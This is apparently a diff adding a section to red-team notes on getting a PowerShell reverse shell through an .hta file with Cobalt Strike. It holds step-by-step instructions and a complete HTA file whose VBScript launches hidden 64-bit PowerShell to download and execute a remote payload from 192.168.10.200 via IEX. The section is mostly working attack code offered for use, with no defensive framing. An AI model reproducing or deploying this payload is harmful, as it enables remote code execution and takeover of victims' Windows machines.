@@ -42,3 +42,26 @@
   </script>
 </html>
 ```
+### .hta file execution (requres Internet Explorer) 03 - Get poweshell reverse shell
+1. In CS navigate to **Attacks > Web Drive-by > Scripted Web Delivery (S) and generate a 64-bit PowerShell payload for HTTP listener**. The URI path can be anything for e.g I had it **/tempOld**. 
+2. By default if we use **powershell.exe** instead of giving the full path its not going to laucnh. This is because we have a **64bit** powershell payload but **.hta** uses **32 bit mstha.exe**. However, we can fix it by specifiying the fullpath with **sysnative**
+```
+<html>
+  <head>
+    <title>PS Shell</title>
+  </head>
+  <body>
+    <h2>get shell PS</h2>
+    <p>This is a HTA...</p>
+  </body>
+
+  <script language="VBScript">
+    Function Pwn()
+      Set shell = CreateObject("wscript.Shell")
+      shell.exec "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
+    End Function
+
+    Pwn
+  </script>
+</html>
+```
